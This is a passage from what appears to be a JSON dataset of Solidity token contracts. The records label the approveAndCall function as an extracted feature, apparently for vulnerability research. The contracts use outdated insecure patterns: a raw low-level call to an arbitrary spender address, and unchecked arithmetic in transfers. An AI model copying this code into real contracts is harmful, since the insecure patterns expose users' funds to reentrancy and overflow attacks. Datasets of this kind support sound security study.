}\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db8fcb296bdecdb1677"
  },
  "filename": "923.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract ERC20 {\n function transfer(address _recipient, uint256 _value) public returns (bool success);\n}\ncontract Airdrop {\n function drop(ERC20 token, address[] recipients, uint256[] values) public {\n for (uint256 i = 0; i < recipients.length; i++) {\n token.transfer(recipients[i], values[i]);\n }\n }\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Testtoken5 is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function Testtoken5() {\n balances[msg.sender] = 100000000000000000000000000000;\n totalSupply = 100000000000000000000000000000;\n name = \"Testtoken4\";\n decimals = 18;\n symbol = \"TT5\";\n unitsOneEthCanBuy = 10000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n function multisend ( ERC20 token , address [] recipients , uint256 value ) public {\n for ( uint256 i = 0 ; i < recipients . length ; i ++) {\n token . transfer ( recipients [ i ], value * 1000000000000000000 );\n }\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
}]